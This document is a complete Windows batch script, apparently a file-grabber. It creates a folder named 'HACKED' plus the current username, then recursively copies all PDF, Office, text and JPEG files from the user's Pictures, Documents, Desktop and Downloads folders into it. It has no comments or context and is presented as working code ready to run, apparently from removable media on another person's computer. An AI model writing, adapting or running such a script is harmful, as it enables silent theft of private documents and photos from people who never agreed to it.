@echo off
color 2

IF NOT EXIST ".\HACKED\"%USERNAME% MD ".\HACKED\"%USERNAME%
cd ".\HACKED\"%USERNAME%
for /R %USERPROFILE%\Pictures\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERPROFILE%\Documents\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERPROFILE%\Desktop\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERPROFILE%\Downloads\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
EXIT